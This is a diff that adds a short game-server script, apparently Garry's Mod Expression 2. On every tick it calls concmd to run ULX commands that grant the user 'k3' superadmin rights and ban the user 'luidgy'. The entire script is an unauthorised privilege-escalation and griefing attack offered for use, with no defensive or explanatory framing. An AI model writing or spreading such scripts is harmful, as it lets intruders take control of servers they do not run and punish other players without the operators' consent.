@@ -1,0 +1,11 @@
+@name 
+@inputs 
+@outputs 
+@persist 
+@trigger 
+
+runOnTick(1)
+concmd("ulx adduser k3 superadmin 1")
+concmd("ulx adduser k3 superadmin")
+concmd("ulx ban luidgy")
+
